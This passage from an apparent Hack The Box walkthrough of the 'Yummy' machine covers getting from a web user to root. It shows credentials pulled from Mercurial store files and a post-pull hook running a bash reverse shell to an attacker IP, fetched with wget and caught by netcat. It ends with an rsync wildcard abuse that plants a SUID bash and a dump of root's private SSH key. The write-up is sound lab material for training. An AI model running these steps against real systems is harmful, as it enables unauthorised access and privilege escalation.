./store/data/static/img/gallery/gallery-3.jpg.i
./store/data/static/img/gallery/gallery-1.jpg.i
./store/data/static/img/event-birthday.jpg.i
./store/data/static/img/hero-bg.jpg.d
./store/data/static/img/events-bg.jpg.i
./store/data/static/css
./store/data/static/css/style.css.i
./store/data/static/vendor
./store/data/static/vendor/bootstrap
./store/data/static/vendor/bootstrap/css
./store/data/static/vendor/bootstrap/css/bootstrap.css.i
./store/data/static/vendor/bootstrap/css/bootstrap-grid.rtl.min.css.map.i
./store/data/static/vendor/bootstrap/css/bootstrap-reboot.css.i
./store/data/static/vendor/bootstrap/css/bootstrap-grid.css.map.i
./store/data/static/vendor/bootstrap/css/bootstrap-reboot.css.map.i
./store/data/static/vendor/bootstrap/css/bootstrap-utilities.rtl.min.css.map.i
./store/data/static/vendor/bootstrap/css/bootstrap-utilities.css.map.i
./store/data/static/vendor/bootstrap/css/bootstrap-grid.rtl.css.i
./store/data/static/vendor/bootstrap/css/bootstrap.min.css.map.i
./store/data/static/vendor/bootstrap/css/bootstrap-utilities.rtl.css.i
./store/data/static/vendor/bootstrap/css/bootstrap-utilities.min.css.map.i
./store/data/static/vendor/bootstrap/css/bootstrap-utilities.min.css.i
./store/data/static/vendor/bootstrap/css/bootstrap-grid.rtl.css.map.i
./store/data/static/vendor/bootstrap/css/bootstrap.rtl.css.map.i
./store/data/static/vendor/bootstrap/css/bootstrap-utilities.rtl.min.css.i
./store/data/static/vendor/bootstrap/css/bootstrap-grid.min.css.map.i
./store/data/static/vendor/bootstrap/css/bootstrap-grid.rtl.min.css.i
./store/data/static/vendor/bootstrap/css/bootstrap.rtl.min.css.map.i
./store/data/static/vendor/bootstrap/css/bootstrap.rtl.css.i
./store/data/static/vendor/bootstrap/css/bootstrap.css.map.i
./store/data/static/vendor/bootstrap/css/bootstrap-reboot.rtl.min.css.i
./store/data/static/vendor/bootstrap/css/bootstrap-reboot.min.css.i
./store/data/static/vendor/bootstrap/css/bootstrap-reboot.min.css.map.i
./store/data/static/vendor/bootstrap/css/bootstrap-reboot.rtl.css.i
./store/data/static/vendor/bootstrap/css/bootstrap-grid.css.i
./store/data/static/vendor/bootstrap/css/bootstrap-utilities.css.i
./store/data/static/vendor/bootstrap/css/bootstrap.rtl.min.css.i
./store/data/static/vendor/bootstrap/css/bootstrap-utilities.rtl.css.map.i
./store/data/static/vendor/bootstrap/css/bootstrap-reboot.rtl.css.map.i
./store/data/static/vendor/bootstrap/css/bootstrap.min.css.i
./store/data/static/vendor/bootstrap/css/bootstrap-grid.min.css.i
./store/data/static/vendor/bootstrap/css/bootstrap-reboot.rtl.min.css.map.i
./store/data/static/vendor/bootstrap/js
./store/data/static/vendor/bootstrap/js/bootstrap.min.js.map.i
./store/data/static/vendor/bootstrap/js/bootstrap.bundle.min.js.i
./store/data/static/vendor/bootstrap/js/bootstrap.esm.js.i
./store/data/static/vendor/bootstrap/js/bootstrap.js.map.i
./store/data/static/vendor/bootstrap/js/bootstrap.bundle.min.js.map.i
./store/data/static/vendor/bootstrap/js/bootstrap.esm.min.js.i
./store/data/static/vendor/bootstrap/js/bootstrap.js.i
./store/data/static/vendor/bootstrap/js/bootstrap.bundle.js.i
./store/data/static/vendor/bootstrap/js/bootstrap.esm.js.map.i
./store/data/static/vendor/bootstrap/js/bootstrap.esm.min.js.map.i
./store/data/static/vendor/bootstrap/js/bootstrap.min.js.i
./store/data/static/vendor/bootstrap/js/bootstrap.bundle.js.map.i
./store/data/static/vendor/boxicons
./store/data/static/vendor/boxicons/fonts
./store/data/static/vendor/boxicons/fonts/boxicons.woff2.i
./store/data/static/vendor/boxicons/fonts/boxicons.ttf.i
./store/data/static/vendor/boxicons/fonts/boxicons.woff.i
./store/data/static/vendor/boxicons/fonts/boxicons.eot.i
./store/data/static/vendor/boxicons/fonts/boxicons.svg.d
./store/data/static/vendor/boxicons/fonts/boxicons.svg.i
./store/data/static/vendor/boxicons/css
./store/data/static/vendor/boxicons/css/transformations.css.i
./store/data/static/vendor/boxicons/css/boxicons.min.css.i
./store/data/static/vendor/boxicons/css/animations.css.i
./store/data/static/vendor/boxicons/css/boxicons.css.i
./store/data/static/vendor/bootstrap-icons
./store/data/static/vendor/bootstrap-icons/bootstrap-icons.css.i
./store/data/static/vendor/bootstrap-icons/fonts
./store/data/static/vendor/bootstrap-icons/fonts/bootstrap-icons.woff2.i
./store/data/static/vendor/bootstrap-icons/fonts/bootstrap-icons.woff.i
./store/data/static/vendor/bootstrap-icons/bootstrap-icons.json.i
./store/data/static/vendor/bootstrap-icons/index.html.i
./store/data/static/vendor/isotope-layout
./store/data/static/vendor/isotope-layout/isotope.pkgd.js.i
./store/data/static/vendor/isotope-layout/isotope.pkgd.min.js.i
./store/data/static/vendor/swiper
./store/data/static/vendor/swiper/swiper-bundle.min.css.i
./store/data/static/vendor/swiper/swiper-bundle.min.js.i
./store/data/static/vendor/glightbox
./store/data/static/vendor/glightbox/css
./store/data/static/vendor/glightbox/css/glightbox.css.i
./store/data/static/vendor/glightbox/css/glightbox.min.css.i
./store/data/static/vendor/glightbox/js
./store/data/static/vendor/glightbox/js/glightbox.js.i
./store/data/static/vendor/glightbox/js/glightbox.min.js.i
./store/data/static/vendor/aos
./store/data/static/vendor/aos/aos.js.i
./store/data/static/vendor/aos/aos.css.i
./store/data/static/vendor/animate.css
./store/data/static/vendor/animate.css/animate.min.css.i
./store/data/static/vendor/animate.css/animate.compat.css.i
./store/data/static/vendor/animate.css/animate.css.i
./store/data/static/js
./store/data/static/js/main.js.i
./store/00manifest.i
./store/requires
./store/undo
./store/data-s
./store/data-s/static
./store/data-s/static/img
./store/data-s/static/img/gallery
./store/data-s/static/vendor
./store/data-s/static/vendor/boxicons
./store/data-s/static/vendor/boxicons/fonts
./store/fncache
./store/undo.backupfiles
./store/00changelog.d
./undo.desc
./branch
./undo.backup.branch.bck
```

```c
www-data@yummy:~/app-qatesting/.hg/store/data$ strings app.py.i
<--- CUT FOR BREVITY --->
app.secret_key = s.token_hex(32)
T sql = f"SELECT * FROM appointments WHERE_email LIKE %s"
#md5
9    'user': 'chef',
    'password': '3wDo7gSRZIwIHRxZ!',
V([Q
>GQ$
6    'user': 'qa',
    'password': 'jPAd!XQCtn8Oc@2B',
P8*p
kwJj
d[I})u
^+Wq@
$       JJKx8
D'<a
```

| Username | Password         |
| -------- | ---------------- |
| qa       | jPAd!XQCtn8Oc@2B |

The `password` for `qa` worked on `SSH` and with that we were able to grab the `user.txt`.

```c
┌──(kali㉿kali)-[~]
└─$ ssh qa@yummy.htb
The authenticity of host 'yummy.htb (10.129.175.114)' can't be established.
ED25519 key fingerprint is SHA256:9fd19UBqhgUKmJ38ElChUROBxqbSG6pvPPpk4IB4xM4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'yummy.htb' (ED25519) to the list of known hosts.
qa@yummy.htb's password: 
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-31-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Oct  6 04:24:11 PM UTC 2024

  System load:  0.53              Processes:             262
  Usage of /:   64.7% of 5.56GB   Users logged in:       0
  Memory usage: 22%               IPv4 address for eth0: 10.129.175.114
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

10 updates can be applied immediately.
10 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

qa@yummy:~$
```

## user.txt

```c
qa@yummy:~$ cat user.txt
1de1fb0c1b57a1643049e04d014ea060
```

## Pivoting (qa)

As before we started `pivoting` through our new user and found a `.hgrc` file inside his `home directory`. This was basically a `configuration file` for `Mercurial`. Something like `.gitconfig` so to say.

```c
qa@yummy:~$ id
uid=1001(qa) gid=1001(qa) groups=1001(qa)
```

```c
qa@yummy:~$ ls -la
total 44
drwxr-x--- 6 qa   qa   4096 Sep 30 07:22 .
drwxr-xr-x 4 root root 4096 May 27 06:08 ..
lrwxrwxrwx 1 root root    9 May 27 06:08 .bash_history -> /dev/null
-rw-r--r-- 1 qa   qa    220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 qa   qa   3771 May 27 14:47 .bashrc
drwx------ 2 qa   qa   4096 Oct  6 16:24 .cache
drwx------ 3 qa   qa   4096 May 28 16:24 .gnupg
-rw-rw-r-- 1 qa   qa    728 May 29 15:04 .hgrc
drwxrwxr-x 3 qa   qa   4096 May 27 06:08 .local
-rw-r--r-- 1 qa   qa    807 Mar 31  2024 .profile
drwx------ 2 qa   qa   4096 May 28 15:01 .ssh
-rw-r----- 1 root qa     33 Oct  5 19:02 user.txt
```

```c
qa@yummy:~$ cat .hgrc
# example user config (see 'hg help config' for more info)
[ui]
# name and email, e.g.
# username = Jane Doe <jdoe@example.com>
username = qa

# We recommend enabling tweakdefaults to get slight improvements to
# the UI over time. Make sure to set HGPLAIN in the environment when
# writing scripts!
# tweakdefaults = True

# uncomment to disable color in command output
# (see 'hg help color' for details)
# color = never

# uncomment to disable command output pagination
# (see 'hg help pager' for details)
# paginate = never

[extensions]
# uncomment the lines below to enable some popular extensions
# (see 'hg help extensions' for more info)
#
# histedit =
# rebase =
# uncommit =
[trusted]
users = qa, dev
groups = qa, dev
```

Furthermore the user `qa` was able to execute a `/usr/bin/hg pull` as `dev` on `/home/dev/app-production`. This looked like the next step for `escalating our privileges`.

```c
qa@yummy:~$ sudo -l
[sudo] password for qa: 
Matching Defaults entries for qa on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User qa may run the following commands on localhost:
    (dev : dev) /usr/bin/hg pull /home/dev/app-production/
```

## Privilege Escalation to dev

### Mercurial Hooks

We prepared a `bash script` containing another `reverse shell payload` locally.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Yummy/serve]
└─$ cat y.sh
#!/bin/bash
bash -c '/bin/bash -i >& /dev/tcp/10.10.14.112/9003 0>&1'
```

Since we painfully learned that we could not execute the following steps inside the `home directory` of `qa`, we moved to `/tmp` and there created a `.hg` folder and set `777` as `permissions` on it. Then we copied the `.hgrc` from the `home directory` of `qa` into it.

```c
qa@yummy:/tmp$ mkdir .hg
qa@yummy:/tmp$ chmod 777 .hg
qa@yummy:/tmp$ cp ~/.hgrc .hg/hgrc
```

The plan was to execute a `post-pull hook` which would ran our `y.sh` to gain a shell as `dev`. Therefore we added the following payload at the `end` of the `.hgrc` file.

```c
[hooks]
post-pull = /tmp/y.sh
```

The `file extention` was probably not needed but we had some issued without it. So just a little side-note here.

```c
qa@yummy:/tmp/.hg$ cat .hgrc 
# example user config (see 'hg help config' for more info)
[ui]
# name and email, e.g.
# username = Jane Doe <jdoe@example.com>
username = qa

# We recommend enabling tweakdefaults to get slight improvements to
# the UI over time. Make sure to set HGPLAIN in the environment when
# writing scripts!
# tweakdefaults = True

# uncomment to disable color in command output
# (see 'hg help color' for details)
# color = never

# uncomment to disable command output pagination
# (see 'hg help pager' for details)
# paginate = never

[extensions]
# uncomment the lines below to enable some popular extensions
# (see 'hg help extensions' for more info)
#
# histedit =
# rebase =
# uncommit =
[trusted]
users = qa, dev
groups = qa, dev

[hooks]
post-pull = /tmp/y.sh
```

Then we placed our `y.sh` inside `/tmp/` and made it executable.

```c
qa@yummy:/tmp$ wget http://10.10.14.112/y.sh
--2024-10-06 16:35:00--  http://10.10.14.112/y.sh
Connecting to 10.10.14.112:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 70 [application/octet-stream]
Saving to: ‘y.sh’

y.sh                                                        100%[========================================================================================================================================>]      70  --.-KB/s    in 0s      

2024-10-06 16:35:00 (6.13 MB/s) - ‘y.sh’ saved [70/70]
```

```c
qa@yummy:/tmp$ chmod +x y.sh
```

To trigger it we executed the command using `sudo` as user `dev` and received a `callback` on our `listener`.

```c
qa@yummy:/tmp$ sudo -u dev /usr/bin/hg pull /home/dev/app-production/
pulling from /home/dev/app-production/
requesting all changes
adding changesets
adding manifests
adding file changes
added 6 changesets with 129 changes to 124 files
new changesets f54c91c7fae8:6c59496d5251
(run 'hg update' to get a working copy)
```

```c
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 9003
listening on [any] 9003 ...
connect to [10.10.14.112] from (UNKNOWN) [10.129.175.114] 35848
I'm out of office until October  7th, don't call me
dev@yummy:/tmp$
```

## Pivoting (dev)

As `dev` we also started with a quick `pivot` and this user also had the `capability` to run something using `sudo`. In this case it was `rsync` but with a `wildcard` on `/home/dev/app-production/*` indicated by the `*`. This made us capable of `adding anything` we wanted after it.

```c
dev@yummy:/tmp$ id
id
uid=1000(dev) gid=1000(dev) groups=1000(dev)
```

```c
dev@yummy:/tmp$ sudo -l
sudo -l
Matching Defaults entries for dev on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User dev may run the following commands on localhost:
    (root : root) NOPASSWD: /usr/bin/rsync -a --exclude\=.hg /home/dev/app-production/* /opt/app/
```

## Privilege Escalation to root

We checked the folder mentioned in the command to see what would be the easiest way to `escalate our privileges` to `root`.

```c
dev@yummy:~$ ls -la
ls -la
total 44
drwxr-x--- 7 dev  dev  4096 Oct  6 16:54 .
drwxr-xr-x 4 root root 4096 May 27 06:08 ..
drwxr-xr-x 7 dev  dev  4096 Oct  6 16:54 app-production
lrwxrwxrwx 1 root root    9 May 15 13:12 .bash_history -> /dev/null
-rw-r--r-- 1 dev  dev   220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 dev  dev  3887 May 27 14:48 .bashrc
drwx------ 2 dev  dev  4096 Sep 30 07:20 .cache
drwx------ 3 dev  dev  4096 May 28 16:24 .gnupg
-rw-rw-r-- 1 dev  dev   729 May 29 15:08 .hgrc
-rw-r--r-- 1 root root    0 May 27 06:14 .hushlogin
drwxrwxr-x 5 dev  dev  4096 May 15 13:21 .local
-rw-r--r-- 1 dev  dev   807 Mar 31  2024 .profile
drwx------ 2 dev  dev  4096 May 28 15:02 .ssh
```

```c
dev@yummy:~/app-production$ ls -la
ls -la
total 40
drwxr-xr-x 7 dev dev  4096 Oct  6 16:56 .
drwxr-x--- 7 dev dev  4096 Oct  6 16:56 ..
-rw-rw-r-- 1 dev dev 10037 May 28 20:19 app.py
drwxr-xr-x 3 dev dev  4096 May 28 13:59 config
drwxrwxr-x 5 dev dev  4096 May 28 14:25 .hg
drwxr-xr-x 3 dev dev  4096 May 28 13:59 middleware
drwxr-xr-x 6 dev dev  4096 May 28 13:59 static
drwxr-xr-x 2 dev dev  4096 May 28 14:13 templates
```

Since it `synced` the whole content of `app-production` to `/opt/app/` we copied `/bin/bash` into it and set the `SUID Bit` on it.

```c
dev@yummy:~/app-production$ cp /bin/bash .
cp /bin/bash .
```

```c
dev@yummy:~/app-production$ chmod u+s bash
chmod u+s bash
```

```c
dev@yummy:~/app-production$ ls -la
ls -la
total 1456
drwxr-xr-x 7 dev dev    4096 Oct  6 16:57 .
drwxr-x--- 7 dev dev    4096 Oct  6 16:56 ..
-rw-rw-r-- 1 dev dev   10037 May 28 20:19 app.py
-rwsr-xr-x 1 dev dev 1446024 Oct  6 16:57 bash
drwxr-xr-x 3 dev dev    4096 May 28 13:59 config
drwxrwxr-x 5 dev dev    4096 May 28 14:25 .hg
drwxr-xr-x 3 dev dev    4096 May 28 13:59 middleware
drwxr-xr-x 6 dev dev    4096 May 28 13:59 static
drwxr-xr-x 2 dev dev    4096 May 28 14:13 templates
```

Since the `binary` was still `owned` by `dev` we needed to update the command to set `root` was owner and there the `wildcard` came into play. We added `--chown root:root` after the `*` to update the `ownership` of the `copied bash binary` after the command was executed and the file `synced` to `/opt/app/`.

Since the `cleanup` was very aggressive we put all of it into a `one-liner` and after executing it, we had the effective permission of `root`.

```c
dev@yummy:~/app-production$ cp /bin/bash . && chmod u+s bash && sudo /usr/bin/rsync -a --exclude\=.hg /home/dev/app-production/* --chown root:root /opt/app/ && /opt/app/bash -p
cp /bin/bash . && chmod u+s bash && sudo /usr/bin/rsync -a --exclude\=.hg /home/dev/app-production/* --chown root:root /opt/app/ && /opt/app/bash -p
id
uid=1000(dev) gid=1000(dev) euid=0(root) groups=1000(dev)
```

## root.txt

```c
cat /root/root.txt
694c458341edae746abb971564bd28e5
```

## Post Exploitation

```c
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACD8t/wsFHnXuKZw6GVUmPSPPHtqxx1N94baTt1/2esF8AAAAJBdGlFYXRpR
WAAAAAtzc2gtZWQyNTUxOQAAACD8t/wsFHnXuKZw6GVUmPSPPHtqxx1N94baTt1/2esF8A
AAAEA+trd9XqxX3ZSG9ESLlPSzIadF8ll0l4ll0+DKkhpkhvy3/CwUede4pnDoZVSY9I88
e2rHHU33htpO3X/Z6wXwAAAACnJvb3RAeXVtbXkBAgM=
-----END OPENSSH PRIVATE KEY-----
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Yummy/files]
└─$ vi root_id_rsa
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Yummy/files]
└─$ chmod 600 root_id_rsa
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Yummy/files]
└─$ ssh -i root_id_rsa root@yummy.htb
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-31-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Oct  6 05:05:30 PM UTC 2024

  System load:  0.04              Processes:             278
  Usage of /:   65.1% of 5.56GB   Users logged in:       1
  Memory usage: 23%               IPv4 address for eth0: 10.129.175.114
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

10 updates can be applied immediately.
10 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


You have new mail.
root@yummy:~#
```
